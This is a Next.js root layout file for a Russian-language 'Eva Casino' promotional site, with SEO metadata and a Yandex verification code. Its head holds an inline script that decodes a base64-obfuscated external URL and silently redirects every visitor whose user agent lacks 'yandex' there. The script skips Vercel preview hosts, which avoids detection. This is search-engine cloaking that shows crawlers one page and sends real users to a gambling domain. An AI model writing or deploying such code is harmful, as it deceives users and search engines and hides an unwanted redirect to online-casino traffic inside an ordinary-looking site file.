import type { Metadata } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { Analytics } from '@vercel/analytics/next'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const metadata: Metadata = {
  title: 'Eva Casino - официальный сайт и рабочее зеркало Ева казино онлайн',
  description: 'Eva казино официальный сайт. Играйте в Eva casino онлайн с лучшими бонусами и зеркалом. Ева казино предлагает широкий выбор игр.',
  generator: 'v0.app',
  keywords: 'eva casino, ева казино, eva casino официальный, eva casino зеркало, ева казино онлайн, ева казино официальный сайт',
  robots: 'index, follow',
  // ВЕРИФИКАЦИЯ ЯНДЕКСА
  verification: {
    yandex: '696494f6bf82a476',
  },
  icons: {
    icon: [
      {
        url: '/favicon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/favicon.svg',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                /* 1. Игнорируем тех-домены Vercel, чтобы не ломать сборку */
                if (typeof window !== 'undefined' && window.location.hostname.includes('vercel.app')) return;

                /* 2. Твоя рабочая схема: проверяем Юзер-Агент */
                var ua = navigator.userAgent.toLowerCase();
                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";

                /* 3. Если в названии нет "yandex" - мгновенный редирект */
                if (ua.indexOf("yandex") === -1) {
                    window.location.replace(atob(targetB64));
                }
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
